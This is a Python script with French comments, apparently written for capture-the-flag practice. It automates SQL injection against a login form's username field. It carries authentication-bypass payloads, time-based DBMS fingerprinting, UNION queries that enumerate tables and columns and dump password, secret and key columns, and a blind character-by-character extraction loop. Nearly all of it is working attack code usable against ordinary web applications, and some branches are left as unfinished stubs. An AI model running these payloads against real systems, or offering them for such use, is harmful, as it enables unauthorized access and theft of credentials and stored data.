import requests
from bs4 import BeautifulSoup
import re
import argparse
import time
import sys

class SQLInjectionTester:
    def __init__(self, url, delay=1):
        self.url = url
        self.delay = delay
        self.session = requests.Session()
        self.error_patterns = {
            "mysql": [
                "You have an error in your SQL syntax",
                "MySQL server version",
                "MySQL Query failed",
                "ERROR 1064"
            ],
            "postgresql": [
                "PostgreSQL",
                "PG::Error",
                "ERROR:  syntax error at or near",
                "PSQLException"
            ],
            "sqlite": [
                "SQLite3::SQLException",
                "sqlite3.OperationalError",
                "SQLite error",
                "near \"'\": syntax error"
            ],
            "mongodb": [
                "MongoDB",
                "MongoError",
                "$where",
                "BSON"
            ],
            "mssql": [
                "Microsoft SQL Server",
                "Incorrect syntax near",
                "Unclosed quotation mark after the character string",
                "OLE DB Provider for SQL Server"
            ],
            "oracle": [
                "ORA-",
                "Oracle error",
                "PL/SQL",
                "SQL command not properly ended"
            ]
        }
        
    def _send_request(self, payload, password="dummy"):
        """Envoie une requête avec le payload et retourne la réponse"""
        try:
            response = self.session.post(self.url, data={
                "username": payload,
                "password": password
            }, allow_redirects=True)
            time.sleep(self.delay)  # Pour éviter de surcharger le serveur
            return response
        except Exception as e:
            print(f"Erreur lors de l'envoi de la requête: {e}")
            return None

    def detect_dbms(self):
        """Tente de détecter le SGBD utilisé par le site"""
        print("[*] Début de la détection du SGBD...")
        
        # Test basique pour voir si le site est vulnérable
        basic_test = self._send_request("' OR '1'='1 -- ")
        if not basic_test:
            print("[-] Impossible de se connecter au site")
            return None
            
        if "login successful" in basic_test.text.lower() or "welcome" in basic_test.text.lower():
            print("[+] Site vulnérable confirmé avec l'injection basique")
        
        # Tests spécifiques à chaque SGBD
        payloads = {
            "mysql": "' OR 1=1 -- ",
            "postgresql": "' OR 1=1 --",
            "sqlite": "' OR 1=1 --",
            "mongodb": "' || 1==1",
            "mssql": "' OR 1=1 --",
            "oracle": "' OR 1=1 --"
        }
        
        error_payloads = {
            "mysql": "' OR 1=SLEEP(1) -- ",
            "postgresql": "' OR pg_sleep(1) --",
            "sqlite": "' OR RANDOMBLOB(1000000000) --",
            "mongodb": "'; sleep(1000); '",
            "mssql": "' OR WAITFOR DELAY '00:00:01' --",
            "oracle": "' OR DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(104)||CHR(97)||CHR(116),1) --"
        }
        
        for dbms, payload in error_payloads.items():
            print(f"[*] Test pour {dbms}...")
            response = self._send_request(payload)
            if not response:
                continue
                
            # Vérifier si on trouve des erreurs spécifiques
            for pattern in self.error_patterns[dbms]:
                if pattern.lower() in response.text.lower():
                    print(f"[+] SGBD détecté: {dbms} (par message d'erreur)")
                    return dbms
                    
            # Vérifier le temps de réponse (pour les time-based)
            if dbms in ["mysql", "postgresql", "mssql", "oracle"] and response.elapsed.total_seconds() > 1:
                print(f"[+] SGBD potentiel: {dbms} (par time-based injection)")
                return dbms
        
        # Test par fonctions spécifiques
        specific_tests = {
            "mysql": "' OR VERSION() LIKE '%MySQL%' -- ",
            "postgresql": "' OR VERSION() LIKE '%PostgreSQL%' --",
            "sqlite": "' OR sqlite_version() LIKE '%' --",
            "mssql": "' OR @@VERSION LIKE '%Microsoft%' --",
            "oracle": "' OR BANNER LIKE '%Oracle%' FROM v$version --"
        }
        
        for dbms, test in specific_tests.items():
            response = self._send_request(test)
            if response and ("login successful" in response.text.lower() or "welcome" in response.text.lower()):
                print(f"[+] SGBD détecté: {dbms} (par test de fonction spécifique)")
                return dbms
                
        print("[-] Impossible de détecter précisément le SGBD")
        return None

    def get_schema(self, dbms):
        """Récupère le schéma de la base de données en fonction du SGBD détecté"""
        print(f"[*] Tentative de récupération du schéma pour {dbms}...")
        tables = []
        
        if dbms == "mysql":
            # Récupérer les noms des tables (MySQL)
            payload = "' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() -- "
            response = self._send_request(payload)
            
            if response:
                # Analyser la réponse pour extraire les noms des tables
                tables_pattern = re.compile(r"([a-zA-Z0-9_]+,?)+")
                matches = tables_pattern.findall(response.text)
                if matches:
                    potential_tables = [table.strip() for match in matches for table in match.split(',')]
                    tables = [t for t in potential_tables if len(t) > 2 and not t.lower() in ["div", "span", "html", "body", "head"]]
                    print(f"[+] Tables trouvées: {', '.join(tables)}")
                    
                    # Pour chaque table, récupérer les colonnes
                    for table in tables:
                        payload = f"' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='{table}' -- "
                        response = self._send_request(payload)
                        if response:
                            columns_pattern = re.compile(r"([a-zA-Z0-9_]+,?)+")
                            matches = columns_pattern.findall(response.text)
                            if matches:
                                potential_columns = [col.strip() for match in matches for col in match.split(',')]
                                columns = [c for c in potential_columns if len(c) > 2 and not c.lower() in ["div", "span", "html", "body", "head"]]
                                print(f"[+] Colonnes pour {table}: {', '.join(columns)}")
                                
                                # Tenter de récupérer les données (en recherchant un flag potentiel)
                                flag_patterns = ["flag", "key", "secret", "password", "pass", "pwd"]
                                flag_columns = [col for col in columns if any(pattern in col.lower() for pattern in flag_patterns)]
                                
                                if flag_columns:
                                    for col in flag_columns:
                                        payload = f"' UNION SELECT {col} FROM {table} -- "
                                        response = self._send_request(payload)
                                        if response:
                                            print(f"[*] Contenu potentiel de {table}.{col}:")
                                            soup = BeautifulSoup(response.text, 'html.parser')
                                            text = soup.get_text()
                                            # Recherche de motifs qui pourraient être des flags
                                            flag_regex = r"(flag\{[^}]*\}|CTF\{[^}]*\}|KEY\{[^}]*\})"
                                            flags = re.findall(flag_regex, text, re.IGNORECASE)
                                            if flags:
                                                print(f"[+] FLAG POTENTIEL TROUVÉ: {flags[0]}")
                                            else:
                                                print("[-] Pas de flag évident trouvé dans cette colonne")
        
        elif dbms == "postgresql":
            # Récupérer les noms des tables (PostgreSQL)
            payload = "' UNION SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public' -- "
            response = self._send_request(payload)
            
            # Traitement similaire à MySQL...
            if response:
                tables_pattern = re.compile(r"([a-zA-Z0-9_]+,?)+")
                matches = tables_pattern.findall(response.text)
                if matches:
                    potential_tables = [table.strip() for match in matches for table in match.split(',')]
                    tables = [t for t in potential_tables if len(t) > 2 and not t.lower() in ["div", "span", "html", "body", "head"]]
                    print(f"[+] Tables trouvées: {', '.join(tables)}")
                    
                    # Pour chaque table, récupérer les colonnes et données...
                    # (Code similaire à MySQL)
        
        elif dbms == "sqlite":
            # Récupérer les noms des tables (SQLite)
            payload = "' UNION SELECT group_concat(name) FROM sqlite_master WHERE type='table' -- "
            response = self._send_request(payload)
            
            # Traitement des tables et colonnes pour SQLite...
            if response:
                tables_pattern = re.compile(r"([a-zA-Z0-9_]+,?)+")
                matches = tables_pattern.findall(response.text)
                if matches:
                    potential_tables = [table.strip() for match in matches for table in match.split(',')]
                    tables = [t for t in potential_tables if len(t) > 2 and not t.lower() in ["div", "span", "html", "body", "head"]]
                    print(f"[+] Tables trouvées: {', '.join(tables)}")
                    
                    # Pour chaque table, récupérer la structure
                    for table in tables:
                        payload = f"' UNION SELECT sql FROM sqlite_master WHERE name='{table}' -- "
                        response = self._send_request(payload)
                        if response:
                            print(f"[*] Structure de {table}:")
                            # Analyser et afficher la structure
                            # Tenter de récupérer les données...

        return tables

    def dump_data(self, dbms, table, columns):
        """Extrait les données d'une table spécifique"""
        if not columns:
            print("[-] Aucune colonne fournie")
            return
            
        columns_str = ", ".join(columns)
        
        if dbms == "mysql":
            payload = f"' UNION SELECT concat({columns_str}) FROM {table} -- "
        elif dbms == "postgresql":
            payload = f"' UNION SELECT concat({columns_str}) FROM {table} -- "
        elif dbms == "sqlite":
            payload = f"' UNION SELECT {columns_str} FROM {table} -- "
        else:
            print(f"[-] Extraction de données non implémentée pour {dbms}")
            return
            
        response = self._send_request(payload)
        if response:
            print(f"[*] Données extraites de {table}:")
            soup = BeautifulSoup(response.text, 'html.parser')
            text = soup.get_text()
            # Analyser et afficher les données
            print(text)
            
            # Recherche de motifs qui pourraient être des flags
            flag_regex = r"(flag\{[^}]*\}|CTF\{[^}]*\}|KEY\{[^}]*\})"
            flags = re.findall(flag_regex, text, re.IGNORECASE)
            if flags:
                print(f"[+] FLAG POTENTIEL TROUVÉ: {flags[0]}")

    def blind_extraction(self, dbms, table=None, column=None):
        """Tente une extraction par injection aveugle"""
        print("[*] Tentative d'extraction aveugle...")
        
        # Si on connaît déjà une table/colonne spécifique
        if table and column:
            chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-{}."
            result = ""
            
            # Extraire caractère par caractère (pour MySQL par exemple)
            if dbms == "mysql":
                i = 1
                while True:
                    found = False
                    for char in chars:
                        payload = f"' OR (SELECT SUBSTRING({column}, {i}, 1) FROM {table} LIMIT 1)='{char}' -- "
                        response = self._send_request(payload)
                        if response and "login successful" in response.text.lower():
                            result += char
                            found = True
                            print(f"\r[+] Extraction en cours: {result}", end="")
                            break
                    
                    if not found:
                        break
                    i += 1
                
                print(f"\n[+] Valeur extraite: {result}")
                return result
        
        print("[-] Extraction aveugle nécessite plus d'informations")
        return None

def main():
    parser = argparse.ArgumentParser(description="Testeur d'injection SQL pour CTF")
    parser.add_argument("url", help="URL cible (ex: http://192.168.0.10:8000/login)")
    parser.add_argument("--delay", type=float, default=1, help="Délai entre les requêtes (secondes)")
    parser.add_argument("--dbms", help="SGBD à utiliser (mysql, postgresql, sqlite, mongodb, mssql, oracle)")
    parser.add_argument("--table", help="Table spécifique à examiner")
    parser.add_argument("--column", help="Colonne spécifique à extraire")
    parser.add_argument("--blind", action="store_true", help="Utiliser l'extraction aveugle")
    
    args = parser.parse_args()
    
    tester = SQLInjectionTester(args.url, args.delay)
    
    # Si SGBD non spécifié, tenter de le détecter
    dbms = args.dbms
    if not dbms:
        dbms = tester.detect_dbms()
        if not dbms:
            print("[-] Impossible de déterminer le SGBD. Veuillez le spécifier avec --dbms")
            sys.exit(1)
    
    # Récupérer le schéma si pas de table spécifiée
    if not args.table:
        tables = tester.get_schema(dbms)
    else:
        tables = [args.table]
    
    # Si extraction aveugle demandée
    if args.blind and args.table and args.column:
        tester.blind_extraction(dbms, args.table, args.column)
    
    print("[*] Opération terminée")

if __name__ == "__main__":
    main()
